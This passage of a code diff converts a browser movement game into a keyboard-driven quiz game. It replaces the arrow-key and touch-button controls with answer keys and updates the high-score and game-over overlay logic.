+      overlay!.classList.add('hidden');
+      showQuestion();
     }
 
     function endGame() {
-      running = false;
+      playing = false;
+      clearInterval(timer!);
+
       if (score > highScore) {
         highScore = score;
-        localStorage.setItem('caroHigh', String(highScore));
-        highScoreEl!.textContent = String(highScore).padStart(4, '0');
-        overlayTitle!.textContent = 'NEW HIGH!';
+        localStorage.setItem('caroQuizHigh', String(highScore));
+        highScoreEl!.textContent = String(highScore);
+        overlayTitle!.textContent = '🎉 NEW HIGH SCORE!';
       } else {
         overlayTitle!.textContent = 'GAME OVER';
       }
+
+      overlaySubtitle!.textContent = `You reached Level ${level} with ${score} points!`;
       startBtn!.textContent = 'PLAY AGAIN';
-      overlay.classList.remove('hidden');
+      overlay!.classList.remove('hidden');
     }
 
-    function move(dir: number) {
-      if (!running) return;
-      caroX += dir * 18;
-      if (caroX < 10) caroX = 10;
-      if (caroX > screenW - CARO_W - 10) caroX = screenW - CARO_W - 10;
-      caroEl.style.left = caroX + 'px';
-    }
+    // Keyboard support
+    document.addEventListener('keydown', (e) => {
+      if (!playing) {
+        if (e.key === ' ' || e.key === 'Enter') {
+          e.preventDefault();
+          startGame();
+        }
+        return;
+      }
 
-    // Keyboard with continuous movement
-    const keys: Record<string, boolean> = {};
-    document.addEventListener('keydown', e => {
-      if (e.key === 'ArrowLeft' || e.key === 'a' || e.key === 'A') { e.preventDefault(); keys.left = true; }
-      if (e.key === 'ArrowRight' || e.key === 'd' || e.key === 'D') { e.preventDefault(); keys.right = true; }
-      if (e.key === ' ' && !running) { e.preventDefault(); startGame(); }
+      const key = e.key.toLowerCase();
+      const index = { 'a': 0, 'b': 1, 'c': 2, 'd': 3, '1': 0, '2': 1, '3': 2, '4': 3 }[key];
+
+      if (index !== undefined && index < currentOptions.length) {
+        const btn = optionsGrid!.querySelectorAll('.option-btn')[index] as HTMLButtonElement;
+        if (btn && !btn.disabled) {
+          btn.click();
+        }
+      }
     });
-    document.addEventListener('keyup', e => {
-      if (e.key === 'ArrowLeft' || e.key === 'a' || e.key === 'A') keys.left = false;
-      if (e.key === 'ArrowRight' || e.key === 'd' || e.key === 'D') keys.right = false;
-    });
 
-    // Key polling loop
-    function keyPoll() {
-      if (keys.left) move(-1);
-      if (keys.right) move(1);
-      requestAnimationFrame(keyPoll);
-    }
-    keyPoll();
-
-    // Button controls
-    startBtn.addEventListener('click', startGame);
-
-    let btnInt: number | null = null;
-    function startBtn_(dir: number) { move(dir); btnInt = window.setInterval(() => move(dir), 50); }
-    function stopBtn_() { if (btnInt) { clearInterval(btnInt); btnInt = null; } }
-
-    leftBtn?.addEventListener('mousedown', () => startBtn_(-1));
-    leftBtn?.addEventListener('touchstart', e => { e.preventDefault(); startBtn_(-1); });
-    rightBtn?.addEventListener('mousedown', () => startBtn_(1));
-    rightBtn?.addEventListener('touchstart', e => { e.preventDefault(); startBtn_(1); });
-    document.addEventListener('mouseup', stopBtn_);
-    document.addEventListener('touchend', stopBtn_);
+    startBtn!.addEventListener('click', startGame);
   })();
 </script>
-
-<style is:global>
-  @keyframes popAnim {
-    0% { opacity: 1; transform: translateY(0) scale(1); }
-    100% { opacity: 0; transform: translateY(-30px) scale(1.3); }
-  }
-</style>
